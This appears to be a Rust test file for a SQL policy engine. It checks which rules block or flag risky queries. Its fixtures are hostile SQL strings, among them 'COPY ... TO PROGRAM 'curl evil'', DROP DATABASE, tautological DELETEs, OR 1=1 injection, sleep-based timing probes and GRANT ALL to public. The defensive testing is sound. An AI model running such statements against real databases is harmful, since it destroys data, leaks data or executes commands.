use vetro_engine::{
    evaluate, Decision, Dialect, EnforcementAction, EnforcementPolicy, Rule, RuleType, Severity,
};

fn rule(code: &str, sev: Severity) -> Rule {
    let action = match sev {
        Severity::Critical | Severity::High => EnforcementAction::Block,
        Severity::Medium => EnforcementAction::Flag,
        _ => EnforcementAction::Monitor,
    };
    Rule {
        rule_id: code.into(),
        code: code.into(),
        severity: sev,
        default_action: action,
        rule_type: RuleType::Standard,
        ast_condition_yaml: None,
    }
}

fn ruleset() -> Vec<Rule> {
    use Severity::*;
    vec![
        rule("VETRO-001", Critical),
        rule("VETRO-003", Critical),
        rule("VETRO-010", Critical),
        rule("VETRO-011", Critical),
        rule("VETRO-012", Critical),
        rule("VETRO-030", Critical),
        rule("VETRO-042", Critical),
        rule("VETRO-090", Critical),
        rule("VETRO-002", High),
        rule("VETRO-013", High),
        rule("VETRO-015", High),
        rule("VETRO-016", High),
        rule("VETRO-031", High),
        rule("VETRO-033", High),
        rule("VETRO-040", High),
        rule("VETRO-070", High),
        rule("VETRO-050", Medium),
        rule("VETRO-051", Medium),
        rule("VETRO-061", Medium),
        rule("VETRO-060", Low),
        // New rules added by the ENG-007/008 fixes.
        rule("VETRO-017", High),
        rule("VETRO-018", High),
        rule("VETRO-019", High),
        rule("VETRO-080", Critical),
        rule("VETRO-081", Critical),
        rule("VETRO-082", High),
        rule("VETRO-083", High),
        rule("VETRO-084", High),
    ]
}

fn matching_codes(sql: &str, d: Dialect, rules: &[Rule], p: &EnforcementPolicy) -> Vec<String> {
    rules
        .iter()
        .filter(|r| {
            let o = evaluate(sql, d, std::slice::from_ref(r), p);
            o.rule_code.is_some() && o.rule_code.as_deref() != Some("VETRO-PARSE-ERROR")
        })
        .map(|r| r.code.clone())
        .collect()
}

#[test]
fn audit() {
    let rules = ruleset();
    let policy = EnforcementPolicy::default();
    let (pg, my) = (Dialect::Postgres, Dialect::Mysql);
    let cases: Vec<(&str, &str, Vec<Dialect>)> = vec![
        ("DELETE no WHERE", "DELETE FROM users", vec![pg, my]),
        (
            "DELETE id=id",
            "DELETE FROM users WHERE id = id",
            vec![pg, my],
        ),
        (
            "SELECT cols LIMIT",
            "SELECT id FROM t WHERE id = 1 LIMIT 10",
            vec![pg, my],
        ),
        (
            "INSERT..SELECT",
            "INSERT INTO t SELECT * FROM u",
            vec![pg, my],
        ),
        ("DROP DATABASE", "DROP DATABASE prod", vec![pg, my]),
        (
            "OR 1=1 subquery",
            "SELECT id FROM (SELECT * FROM users WHERE id=1 OR 1=1) x LIMIT 5",
            vec![pg, my],
        ),
        (
            "SELECT* subquery",
            "SELECT id FROM (SELECT * FROM users) x LIMIT 5",
            vec![pg, my],
        ),
        ("pg_sleep", "SELECT pg_sleep(5)", vec![pg]),
        ("sleep mysql", "SELECT sleep(5)", vec![my]),
        (
            "GRANT",
            "GRANT ALL ON ALL TABLES IN SCHEMA public TO public",
            vec![pg],
        ),
        (
            "DO block",
            "DO $$ BEGIN DELETE FROM users; END $$",
            vec![pg],
        ),
        (
            "COPY PROGRAM",
            "COPY users TO PROGRAM 'curl evil'",
            vec![pg],
        ),
        (
            "MERGE",
            "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
            vec![pg],
        ),
        (
            "ALTER DROP CONSTRAINT",
            "ALTER TABLE t DROP CONSTRAINT fk",
            vec![pg, my],
        ),
        (
            "ALTER DISABLE TRIGGER",
            "ALTER TABLE t DISABLE TRIGGER ALL",
            vec![pg],
        ),
    ];
    for (label, sql, ds) in &cases {
        for d in ds {
            let dn = if *d == pg { "pg" } else { "my" };
            let out = evaluate(sql, *d, &rules, &policy);
            let dec = match out.decision {
                Decision::Allow => "ALLOW",
                Decision::Flag => "FLAG",
                Decision::Block => "BLOCK",
            };
            println!(
                "[{dn}] {:<22} -> {:<5} win={:<16} matches={:?}",
                label,
                dec,
                out.rule_code.as_deref().unwrap_or("-"),
                matching_codes(sql, *d, &rules, &policy)
            );
        }
    }
}

// ── Regression locks: each previously-failing gap now asserts ────────────────
//
// `expect_matches` asserts the FULL set of rules that fire for a query (order
// independent), so both false negatives (gap reopens) and new false positives
// (over-blocking a safe query) fail the test.

fn assert_matches(label: &str, sql: &str, d: Dialect, mut expected: Vec<&str>) {
    let rules = ruleset();
    let policy = EnforcementPolicy::default();
    let mut got = matching_codes(sql, d, &rules, &policy);
    got.sort();
    expected.sort();
    assert_eq!(
        got, expected,
        "{label}: `{sql}` matched {got:?}, expected {expected:?}"
    );
}

#[test]
fn eng_001_limit_bounds_non_pg_select() {
    // MySQL SELECT with LIMIT must NOT trip VETRO-050 anymore.
    assert_matches(
        "ENG-001 mysql limit",
        "SELECT id FROM t WHERE id = 1 LIMIT 10",
        Dialect::Mysql,
        vec![],
    );
    // FETCH FIRST / TOP also bound the read.
    assert_matches(
        "ENG-001 fetch first",
        "SELECT id FROM t WHERE id = 1 FETCH FIRST 10 ROWS ONLY",
        Dialect::Mysql,
        vec![],
    );
    assert_matches(
        "ENG-001 mssql top",
        "SELECT TOP 10 id FROM t WHERE id = 1",
        Dialect::MsSql,
        vec![],
    );
    // No LIMIT still flags.
    assert_matches(
        "ENG-001 no limit still flags",
        "SELECT id FROM t WHERE id = 1",
        Dialect::Mysql,
        vec!["VETRO-050"],
    );
}

#[test]
fn eng_002_003_pg_insert() {
    // INSERT … SELECT now flags VETRO-040 on Postgres.
    let m = matching_codes(
        "INSERT INTO archive SELECT * FROM users",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-040".to_string()), "got {m:?}");
    // INSERT … VALUES is NOT a SELECT source.
    let m = matching_codes(
        "INSERT INTO t (a) VALUES (1)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VETRO-040".to_string()), "got {m:?}");
}

#[test]
fn eng_004_drop_database_pg() {
    assert_matches(
        "ENG-004 drop database",
        "DROP DATABASE prod",
        Dialect::Postgres,
        vec!["VETRO-010"],
    );
}

#[test]
fn eng_005_nested_select_attrs_pg() {
    // OR 1=1 hidden in a subquery is caught even with a bounded outer query.
    assert_matches(
        "ENG-005 nested tautology",
        "SELECT id FROM (SELECT * FROM users WHERE id=1 OR 1=1) x LIMIT 5",
        Dialect::Postgres,
        vec!["VETRO-090"],
    );
    // Inner SELECT * (no WHERE) is caught by VETRO-051 even though the outer
    // query is bounded; VETRO-050 must NOT fire (outer query has a LIMIT).
    assert_matches(
        "ENG-005 nested star",
        "SELECT id FROM (SELECT * FROM users) x LIMIT 5",
        Dialect::Postgres,
        vec!["VETRO-051"],
    );
}

#[test]
fn eng_006_sleep_in_projection() {
    let m = matching_codes(
        "SELECT pg_sleep(5)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-070".to_string()), "pg got {m:?}");
    let m = matching_codes(
        "SELECT sleep(5)",
        Dialect::Mysql,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-070".to_string()), "mysql got {m:?}");
    // Qualified pg_catalog.pg_sleep is still caught.
    let m = matching_codes(
        "SELECT pg_catalog.pg_sleep(5)",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-070".to_string()), "qualified got {m:?}");
}

#[test]
fn eng_007_dangerous_pg_statements() {
    assert_matches(
        "ENG-007 copy program",
        "COPY users TO PROGRAM 'curl evil'",
        Dialect::Postgres,
        vec!["VETRO-080"],
    );
    assert_matches(
        "ENG-007 do block",
        "DO $$ BEGIN DELETE FROM users; END $$",
        Dialect::Postgres,
        vec!["VETRO-081"],
    );
    assert_matches(
        "ENG-007 grant",
        "GRANT ALL ON ALL TABLES IN SCHEMA public TO public",
        Dialect::Postgres,
        vec!["VETRO-082"],
    );
    assert_matches(
        "ENG-007 merge",
        "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET x=1",
        Dialect::Postgres,
        vec!["VETRO-083"],
    );
    let m = matching_codes(
        "CREATE TABLE leak AS SELECT * FROM users",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-084".to_string()), "ctas got {m:?}");
    // Plain COPY TO STDOUT is not the PROGRAM form → no VETRO-080.
    let m = matching_codes(
        "COPY users TO STDOUT",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VETRO-080".to_string()), "stdout got {m:?}");
}

#[test]
fn eng_008_alter_table_subtypes() {
    for (label, sql, code) in [
        (
            "drop constraint",
            "ALTER TABLE t DROP CONSTRAINT fk",
            "VETRO-017",
        ),
        (
            "alter col type",
            "ALTER TABLE t ALTER COLUMN c TYPE text",
            "VETRO-018",
        ),
        (
            "disable trigger",
            "ALTER TABLE t DISABLE TRIGGER ALL",
            "VETRO-019",
        ),
    ] {
        let m = matching_codes(
            sql,
            Dialect::Postgres,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(m.contains(&code.to_string()), "{label}: got {m:?}");
    }
}

#[test]
fn eng_009_deep_tautology() {
    // All of these are effectively WHERE-less DELETEs → VETRO-003.
    for sql in [
        "DELETE FROM users WHERE id = id",
        "DELETE FROM users WHERE 2 > 1",
        "DELETE FROM users WHERE NOT FALSE",
    ] {
        let m = matching_codes(
            sql,
            Dialect::Postgres,
            &ruleset(),
            &EnforcementPolicy::default(),
        );
        assert!(m.contains(&"VETRO-003".to_string()), "`{sql}` got {m:?}");
    }
    // MySQL truthy literal `WHERE 1`.
    let m = matching_codes(
        "DELETE FROM users WHERE 1",
        Dialect::Mysql,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(m.contains(&"VETRO-003".to_string()), "where 1 got {m:?}");
    // False-positive guard: a real bounded predicate is NOT always-true.
    let m = matching_codes(
        "DELETE FROM users WHERE id = 5",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VETRO-003".to_string()), "id=5 got {m:?}");
    // `2 < 1` is always FALSE → must NOT be treated as always-true.
    let m = matching_codes(
        "DELETE FROM users WHERE 2 < 1",
        Dialect::Postgres,
        &ruleset(),
        &EnforcementPolicy::default(),
    );
    assert!(!m.contains(&"VETRO-003".to_string()), "2<1 got {m:?}");
}

#[test]
fn eng_010_drop_schema_single_match() {
    // DROP SCHEMA must match ONLY VETRO-012, not also VETRO-010.
    assert_matches(
        "ENG-010 drop schema",
        "DROP SCHEMA analytics CASCADE",
        Dialect::Postgres,
        vec!["VETRO-012"],
    );
    // DROP TABLE still matches VETRO-010 (and not VETRO-012).
    assert_matches(
        "ENG-010 drop table",
        "DROP TABLE users",
        Dialect::Postgres,
        vec!["VETRO-010"],
    );
}

#[test]
fn no_regressions_on_safe_queries() {
    // A fully-parameterized, bounded, explicit-column read must stay clean.
    for d in [Dialect::Postgres, Dialect::Mysql] {
        assert_matches(
            "safe read",
            "SELECT id, email FROM users WHERE email = $1 LIMIT 1",
            d,
            vec![],
        );
    }
    // Legitimate OR over two real conditions is not a tautology.
    assert_matches(
        "legit OR",
        "SELECT a, b FROM t WHERE x = 'A' OR x = 'B' LIMIT 10",
        Dialect::Postgres,
        vec![],
    );
}
